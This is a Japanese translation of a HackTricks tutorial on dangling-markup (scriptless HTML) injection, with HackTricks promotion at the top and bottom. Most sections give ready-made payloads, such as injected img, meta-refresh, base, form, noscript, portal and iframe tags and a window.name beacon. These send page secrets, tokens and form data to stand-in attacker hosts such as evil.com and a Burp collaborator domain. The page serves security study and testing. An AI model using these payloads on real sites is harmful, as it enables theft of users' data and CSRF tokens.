# Dangling Markup - HTMLスクリプトレスインジェクション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## 概要

この技術は、**HTMLインジェクションが見つかった**場合にユーザーから情報を抽出するために使用できます。これは、[**XSS**](../xss-cross-site-scripting/)を利用する方法が見つからないが、**いくつかのHTMLタグを注入できる**場合に非常に役立ちます。\
また、何らかの**秘密がクリアテキストでHTMLに保存されている**場合、それをクライアントから**抽出**したい場合や、スクリプト実行を誤解させたい場合にも役立ちます。

ここでコメントされているいくつかの技術は、予期しない方法（HTMLタグ、CSS、http-metaタグ、フォーム、ベースなど）で情報を抽出することによって、いくつかの[**Content Security Policy**](../content-security-policy-csp-bypass/)をバイパスするために使用できます。

## 主な用途

### クリアテキストの秘密を盗む

ページがロードされるときに`<img src='http://evil.com/log.cgi?`を注入すると、被害者は注入された`img`タグとコード内の次の引用符の間のすべてのコードをあなたに送信します。秘密がそのチャンクに何とか位置している場合、あなたはそれを盗むことになります（同じことをダブルクォートを使用して行うことができます、どちらを使用するかもっと興味深いかを見てください）。

`img`タグが禁止されている場合（例えばCSPのために）、`<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`も使用できます。
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
```
**Chromeは"<"や"\n"が含まれているHTTP URLをブロックします**ので、"ftp"のような他のプロトコルスキームを試すことができます。

CSSの`@import`を悪用することもできます（";"を見つけるまで全てのコードを送信します）
```
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
You could also use **`<table`** を使用することもできます：
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
```markdown
`<base` タグを挿入することもできます。クォートが閉じられるまでのすべての情報が送信されますが、いくつかのユーザーの操作が必要です（ユーザーがリンクをクリックする必要があります。なぜなら、base タグはリンクによって指されたドメインを変更しているからです）：
```
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### フォームの盗難
```markup
<base href='http://evil.com/'>
```
```markdown
次に、パスにデータを送信するフォーム（例：`<form action='update_profile.php'>`）は、データを悪意のあるドメインに送信します。

### フォームの盗み取り 2

フォームヘッダーを設定します：`<form action='http://evil.com/log_steal'>` これにより、次のフォームヘッダーが上書きされ、フォームからのすべてのデータが攻撃者に送信されます。

### フォームの盗み取り 3

ボタンは "formaction" 属性を使用して、フォームの情報が送信されるURLを変更できます：
```
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
攻撃者はこれを使用して情報を盗むことができます。

### クリアテキストの秘密を盗む 2

最新の言及された技術を使用してフォームを盗む（新しいフォームヘッダーを注入する）ことで、新しい入力フィールドを注入することができます：
```markup
<input type='hidden' name='review_body' value="
```
この入力フィールドは、HTML内のそのダブルクォートと次のダブルクォートの間のすべてのコンテンツを含むことになります。この攻撃は "_**Stealing clear text secrets**_" と "_**Stealing forms2**_" を組み合わせます。

同じことを、フォームと `<option>` タグを注入することで行うことができます。閉じられた `</option>` が見つかるまでのすべてのデータが送信されます：
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### フォームパラメータインジェクション

フォームのパスを変更し、新しい値を挿入することで、予期しないアクションが実行されます：
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ← Injected lines

<form action="/change_settings.php">                        ← Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ← Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### noscriptを使用してクリアテキストの秘密を盗む

`<noscript></noscript>` は、ブラウザがJavaScriptをサポートしていない場合に内容が解釈されるタグです（ChromeでJavaScriptを有効/無効にするには、[chrome://settings/content/javascript](chrome://settings/content/javascript)にアクセスします）。

攻撃者が制御するサイトへの注入地点からページの内容を抜き取る方法は、以下を注入することです：
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### ユーザーの操作によるCSPのバイパス

この[portswiggers research](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)から、**最もCSPが制限された**環境であっても、いくつかの**ユーザーの操作**を通じてデータを**外部に漏洩**させることができることを学べます。この機会に、以下のペイロードを使用します：
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
**犠牲者**にあなたが制御する**ペイロード**に**リダイレクト**する**リンクをクリック**してもらうことに注意してください。また、**`base`** タグ内の **`target`** 属性は、次のシングルクォートまで**HTMLコンテンツ**を含むことにも注意してください。\
これにより、リンクがクリックされた場合の **`window.name`** の**値**は、そのすべての**HTMLコンテンツ**になります。したがって、リンクをクリックすることで犠牲者がアクセスするページを**制御**しているあなたは、その**`window.name`** にアクセスし、そのデータを**抜き取る**ことができます：
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### 誤解を招くスクリプトワークフロー1 - HTMLネームスペース攻撃

HTML内に新しいタグとIDを挿入し、次のタグを上書きし、スクリプトのフローに影響を与える値を設定します。この例では、情報が共有される相手を選択しています：
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     ← Injected markup
...
Share this status update with:                              ← Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### 誤解を招くスクリプトワークフロー2 - スクリプト名前空間攻撃

HTMLタグを挿入してjavascript名前空間内に変数を作成します。その後、この変数がアプリケーションのフローに影響を与えます：
```markup
<img id='is_public'>                                        ← Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ← The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ← Condition always evaluates to true
...
}
```
### JSONPの悪用

JSONPインターフェースを見つけた場合、任意のデータで任意の関数を呼び出すことができるかもしれません:
```markup
<script src='/editor/sharing.js'>:              ← Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ← Injected JSONP call
set_sharing({ ... })
```
```markdown
または、いくつかのjavascriptを実行してみることもできます：
```
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframeの悪用

**子ドキュメントは、クロスオリジンであっても、親のlocationプロパティを閲覧および設定できることに注意してください。** これは、**iframe**内にあるコードをロードすることで、クライアントに任意の他のページにアクセスさせることができることを意味します。
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
これは、_**sandbox='allow-scripts allow-top-navigation'**_ のようなもので軽減できます。

iframeも、**iframeのname属性を使用して**、異なるページから機密情報を漏洩させるために悪用される可能性があります。これは、HTMLインジェクションを悪用してiframeを自分自身にiframeさせ、**機密情報がiframeのname属性内に表示される**ように作成し、その後、初期のiframeからそのnameにアクセスして情報を漏洩させることができるためです。
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
詳細については、[https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)をご覧ください。

### \<meta abuse

**`meta http-equiv`** を使用して、Cookieの設定: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` やリダイレクトの実行（この場合は5秒後）: `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />` など、**複数のアクション**を実行できます。

これは、**http-equiv**に関する**CSP**（`Content-Security-Policy: default-src 'self';` または `Content-Security-Policy: http-equiv 'self';`）で**回避**できます。

### 新しい\<portal HTMLタグ

\<portalタグの悪用可能な脆弱性に関する非常に**興味深い研究**は[こちら](https://research.securitum.com/security-analysis-of-portal-element/)で見つけることができます。\
この文章を書いている時点では、Chromeで`chrome://flags/#enable-portals`を有効にしないと、portalタグは機能しません。
```markup
<portal src='https://attacker-server?
```
### HTML リーク

HTMLで接続性をリークするすべての方法がDangling Markupに役立つわけではありませんが、時には役立つことがあります。こちらで確認してください: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

これは**dangling markupとXS-Leaksの** **ミックス**です。一方で、攻撃対象となるページと**同じオリジン**のページにHTMLを**インジェクト**する（しかしJSは不可）脆弱性があります。他方で、HTMLをインジェクトできるページを直接**攻撃**するのではなく、**別のページ**を攻撃します。

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Searchは、**サイドチャネル攻撃**を悪用して**クロスオリジン情報を抽出**することに焦点を当てています。したがって、Dangling Markupとは異なる技術ですが、一部の技術はHTMLタグの挿入を悪用しています（JS実行の有無にかかわらず）、例えば[**CSSインジェクション**](../xs-search.md#css-injection)や[**Lazy Load Images**](../xs-search.md#image-lazy-loading)**です。**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## 参考文献

ここで紹介されているすべての技術とその詳細は、以下でレビューできます:

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

他に悪用できるHTMLタグはこちらで見つけることができます:

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

さらに詳しい情報:

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
